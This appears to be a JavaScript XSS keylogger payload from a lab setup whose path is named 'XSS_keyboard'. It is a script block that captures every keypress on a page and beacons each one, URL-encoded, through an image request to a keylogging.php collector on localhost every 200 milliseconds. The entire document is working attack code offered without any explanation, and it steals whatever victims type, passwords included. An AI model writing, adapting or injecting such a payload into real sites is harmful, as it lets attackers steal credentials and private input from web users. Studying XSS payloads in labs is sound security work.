<script>
	var buffer = "";
	
	var klog = 'http://localhost:8081/XSS_keyboard/src/keylogging.php?k='
	document.onkeypress = function(e) {
		buffer = e.key;
 		buffer = " --> " + buffer + "\n";
	}

	window.setInterval(function() {
    	if (buffer.length > 0) {
        	var data = encodeURIComponent(buffer);
        	new Image().src = klog + data;
        	buffer = "";
    		}
    	}, 200);
</script>
